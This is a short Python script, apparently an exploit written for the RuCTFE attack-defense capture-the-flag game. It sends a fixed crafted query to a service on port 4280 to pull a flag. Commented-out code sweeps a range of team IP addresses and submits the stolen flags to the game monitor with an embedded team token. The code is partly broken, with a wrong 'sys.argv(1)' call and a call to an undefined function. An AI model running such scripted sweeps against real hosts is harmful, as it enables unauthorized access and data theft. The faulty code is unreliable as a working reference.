#!/usr/bin/env python3

# from lxml import html
import requests, time, sys

exp = '/memorize?what=Schnapps,Gin,Wine,Brandy,Sherry,Metaxa,Whiskey,Sangria,Stout,Sangria,Ale,Champagne,Sake,Sherry,Horilka,Soju,Water,Vermouth,Sherry,Brandy,Bourbon,Sake,Armagnac,Sangria,Cola,Soju,Armagnac,Cola,Rum,Vinsanto,Brandy&name=DUNNO'

# from termcolor import colored
# from datetime import *
def pwn(ip):
    page1 = requests.get('http://{}:4280{}'.format(ip, exp), timeout=5)
    page2 = requests.get('http://{}:4280{}'.format(ip, exp), timeout=5)


    cont = page2.content
    cont = str(cont)
    cont = cont.strip("b'")
    cont = cont.strip("'")
    # print(cont)
    return (cont)


# def throw():
#     for x in range(255):
#         ip = '10.60.' + str(x) + '.2'
#         ip2 = '10.61.' + str(x) + '.2'
#         flag1 = main(ip)
#         flag2 = main(ip2)
#         r = requests.put('http://monitor.ructfe.org/flags', data='[' + flag1 + ',' + flag2 + ']',
#                          json={'X-Team-Token:2e059bcd-ff85-4142-af4d-906b46840428'})
#

if __name__ == '__main__':
    pwn(sys.argv(1))